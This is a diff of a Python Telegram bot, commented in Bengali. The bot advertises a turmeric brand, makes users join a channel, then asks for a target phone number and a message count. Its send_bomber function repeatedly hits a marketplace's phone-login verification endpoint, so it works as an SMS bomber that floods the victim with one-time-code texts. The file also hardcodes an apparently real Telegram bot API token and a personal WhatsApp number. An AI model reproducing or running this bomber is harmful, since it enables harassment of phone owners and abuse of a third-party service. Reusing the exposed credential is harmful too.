@@ -9,17 +9,17 @@ from threading import Thread
 API_TOKEN = '8678067992:AAEDkPkmtuz86YnrMJcnIVcp19tL52tkyRk'
 CHANNEL_USERNAME = '@developer_of_maruf' 
 
-# আপনার দেওয়া ব্যানারের আসল ডাইরেক্ট লিঙ্ক
+# আপনার দেওয়া মৃত্তিকা হলুদের ব্যানারের লিঙ্ক
 PHOTO_URL = "https://i.ibb.co/6R0VjY8/banner.jpg" 
 WHATSAPP_LINK = "https://wa.me/8801621743805?text=আমি_খাঁটি_হলুদ_অর্ডার_করতে_চাই"
 
 bot = telebot.TeleBot(API_TOKEN)
 user_data = {}
 
-# ২. Render সার্ভার সচল রাখার জন্য
+# ২. Render সার্ভার সচল রাখার জন্য Flask
 app = Flask('')
 @app.route('/')
-def home(): return "Mritika Bot is Live!"
+def home(): return "Mritika Bot is Online!"
 
 def run():
     app.run(host='0.0.0.0', port=8080)
@@ -35,13 +35,13 @@ def check_join(chat_id):
     except:
         return False
 
-# ৩. স্টার্ট কমান্ড (ধাপে ধাপে মেসেজ আসবে)
+# ৩. স্টার্ট কমান্ড (ধাপে ধাপে আলাদা মেসেজ আসবে)
 @bot.message_handler(commands=['start'])
 def welcome(message):
     chat_id = message.chat.id
     
     if check_join(chat_id):
-        # প্রথম মেসেজ: মৃত্তিকা হলুদের ব্যানার ও বিজ্ঞাপন
+        # প্রথম মেসেজ: মৃত্তিকা হলুদের বিজ্ঞাপন ও বাটন
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("🛒 খাঁটি হলুদ অর্ডার (WhatsApp)", url=WHATSAPP_LINK))
         
@@ -53,19 +53,17 @@ def welcome(message):
             reply_markup=markup
         )
         
-        # ১ সেকেন্ড বিরতি দিয়ে দ্বিতীয় মেসেজ
-        time.sleep(1)
-        
+        # ১.৫ সেকেন্ড বিরতি দিয়ে দ্বিতীয় মেসেজ
+        time.sleep(1.5)
         bot.send_message(chat_id, "✅ **ভেরিফিকেশন সফল হয়েছে!**", parse_mode="Markdown")
         
-        # আরও ১ সেকেন্ড বিরতি দিয়ে তৃতীয় মেসেজ (নাম্বার চাওয়া)
+        # ১ সেকেন্ড বিরতি দিয়ে তৃতীয় মেসেজ (নাম্বার চাওয়া)
         time.sleep(1)
-        
-        msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন আপনার নাম্বারটি লিখুন (যেমন: 017xxxxxxxx):")
+        msg = bot.send_message(chat_id, "🚀 SMS পাঠাতে এখন আপনার নাম্বারটি দিন (যেমন: 017xxxxxxxx):")
         bot.register_next_step_handler(msg, get_number)
         
     else:
-        # জয়েন না থাকলে জয়েন বাটন
+        # জয়েন না থাকলে
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/developer_of_maruf"))
         markup.add(types.InlineKeyboardButton("🔄 Verify Done", callback_data="verify_join"))
@@ -98,18 +96,17 @@ def send_bomber(message):
     try:
         amount = int(message.text)
         num = user_data[message.chat.id]
-        
         bot.send_message(message.chat.id, f"🚀 {num} নাম্বারে {amount}টি SMS পাঠানো শুরু হচ্ছে...")
         
         for i in range(amount):
+            # API রিকোয়েস্ট (এখানে একটি ডেমো API আছে)
             requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", timeout=5)
             
-        # বোম্বিং শেষ হলে আবার বিজ্ঞাপনের মেসেজ
         bot.send_message(message.chat.id, "✅ কাজ শেষ! আবার পাঠাতে /start দিন।")
-        
     except:
         bot.send_message(message.chat.id, "❌ শুধু সংখ্যা লিখুন।")
 
 if __name__ == "__main__":
     keep_alive()
-    bot.infinity_polling(timeout=10, long_polling_timeout=5)
+    bot.infinity_polling(timeout=20, long_polling_timeout=10)
+  
